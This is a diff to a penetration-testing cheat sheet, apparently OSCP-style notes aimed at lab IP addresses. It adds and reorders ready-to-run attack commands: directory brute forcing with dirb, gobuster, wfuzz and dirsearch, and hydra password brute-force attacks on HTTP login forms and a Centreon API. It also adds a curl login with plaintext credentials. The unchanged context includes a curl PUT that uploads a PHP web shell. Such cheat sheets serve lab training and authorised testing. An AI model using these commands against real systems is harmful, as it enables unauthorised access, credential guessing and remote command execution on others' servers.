@@ -467,6 +467,9 @@ curl 10.11.1.111 -s -L | html2text -width '99' | uniq
 curl -v -X OPTIONS http://10.11.1.111/
 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://10.11.1.111/test/shell.php
 
+# Simple curl POST request with login data
+curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'
+
 dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
 
 ```
@@ -474,20 +477,21 @@ dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
 ### Url brute force
 
 ```
-# Not recursive
+# Dirb not recursive
 dirb http://10.11.1.111 -r -o dirb-10.11.1.111.txt
-
-# Gobuster - remove relevant responde codes (403 for example)
-gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
 
 # Wfuzz
 wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.11.1.8/FUZZ
 
+# GoBuster
+gobuster dir -u http://10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
 gobuster dir -e -u http://10.11.1.111/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 gobuster dir -u http://$10.11.1.111 -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
 gobuster dir -e -u http://10.11.1.111/ -w /usr/share/wordlists/dirb/common.txt
 
 dotdotpwn.pl -m http -h 10.11.1.111 -M GET -o unix
+
+./dirsearch.py -u 10.10.10.157 -e php
 
 medusa -h 10.11.1.111 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
 ```
@@ -613,8 +617,15 @@ hydra -P password-file.txt -v 10.11.1.111 snmp
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 ftp -V
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 10.11.1.111 pop3 -V
 hydra -P /usr/share/wordlistsnmap.lst 10.11.1.111 smtp -V
+
+# SIMPLE LOGIN GET
 hydra -L cewl_fin_50.txt -P cewl_fin_50.txt 10.11.1.111 http-get-form "/~login:username=^USER^&password=^PASS^&Login=Login:Unauthorized" -V
+
+# SIMPLE LOGIN POST
 hydra -l root@localhost -P cewl 10.11.1.111 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I
+
+# API REST LOGIN POST
+hydra -l admin -P /usr/share/wordlists/wfuzz/others/common_pass.txt -V -s 80 10.11.1.111 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:Bad credentials" -t 64
 ```
 
 Online crackers
